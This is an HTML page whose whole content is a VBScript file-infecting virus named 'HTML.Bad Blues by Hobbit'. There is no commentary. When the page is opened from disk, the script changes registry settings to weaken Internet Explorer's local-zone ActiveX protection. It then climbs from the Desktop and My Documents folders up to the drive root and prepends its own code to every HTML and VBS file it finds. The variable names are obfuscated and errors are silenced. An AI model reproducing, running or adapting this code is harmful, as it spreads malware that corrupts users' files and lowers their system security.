<!--HTML.Bad Blues-->
<html><body>
<script Language="VBScript"><!--
on error resume next
REM HTML.Bad Blues by Hobbit
if location.protocol="file:" then
randomize
if int(rnd*88888)+1=1 then msgbox "Hobbit Test Virus"
set a0h2c6=createobject("WScript.Shell")
set d1d4a4=createobject("Scripting.FileSystemObject")
a8a2i3=Replace(location.href,"/","\"):a8a2i3=Replace(a8a2i3,"file:\\\", ""):a8a2i3=d1d4a4.GetParentFolderName(a8a2i3)
set f3g8f3=document.body.createtextrange
a0h2c6.Regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"
a0h2c6.RegWrite"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"
f8g2a6(a0h2c6.SpecialFolders("Desktop"))
f8g2a6(a0h2c6.SpecialFolders("MyDocuments"))
end if
sub f8g2a6(b3e2h2)
on error resume next
if d1d4a4.FolderExists(b3e2h2) then
Do
Set e1h2f9=d1d4a4.GetFolder(b3e2h2)
b3e2h2=d1d4a4.GetParentFolderName(b3e2h2)
Set e8h0b1=e1h2f9.Files
For each a7e8f5 in e8h0b1
f0f0f6=ucase(d1d4a4.GetExtensionName(a7e8f5.Name))
if f0f0f6="HTML" or f0f0f6="HTM" or f0f0f6="HTT" or f0f0f6="SHTML" or f0f0f6="VBE" or f0f0f6="VBS" then
Set f7f2g5=d1d4a4.OpenTextFile(a7e8f5.path,1,False)
i6i2g2=f7f2g5.Readline
if i6i2g2="<!--HTML.Bad Blues-->" then
f7f2g5.close()
else
c8b2f9(a7e8f5.path)
end if
end if
next
Loop Until e1h2f9.IsRootFolder = True
end if
end sub
sub c8b2f9(i6d0f9)
On Error Resume Next
Set f7f2g5=d1d4a4.OpenTextFile(i6d0f9,1,False)
b1c1f4=f7f2g5.ReadAll()
f7f2g5.close()
Set f7f2g5=d1d4a4.OpenTextFile(i6d0f9,2,False)
f7f2g5.WriteLine("<!--HTML.Bad Blues-->")
f7f2g5.Write("<html><body>")
f7f2g5.WriteLine f3g8f3.htmlText
f7f2g5.WriteLine("</body></html>")
f7f2g5.Write(b1c1f4)
f7f2g5.Close
end sub
--></script>
</body></html>
